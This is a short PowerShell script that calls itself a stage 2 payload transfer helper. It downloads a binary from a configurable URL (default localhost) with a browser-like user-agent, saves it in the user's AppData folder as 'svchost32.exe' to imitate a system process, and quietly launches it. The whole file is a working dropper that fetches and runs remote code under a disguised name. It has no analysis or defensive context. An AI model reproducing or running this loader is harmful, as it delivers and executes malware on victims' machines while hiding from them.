
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://localhost:8000/payload.bin',
    [string]$WorkingPath = "$env:APPDATA\svchost32.exe",
    [int]$TimeoutSec = 47,
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$TransferResult = Get-Stage2Payload -SourceUrl $TransferUrl -DestinationPath $WorkingPath -TimeoutSec $TimeoutSec -UserAgent $RequestAgent
if ($TransferResult) {
    Start-Process -FilePath $WorkingPath -ErrorAction SilentlyContinue
}

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$ProgressPreference = "SilentlyContinue"
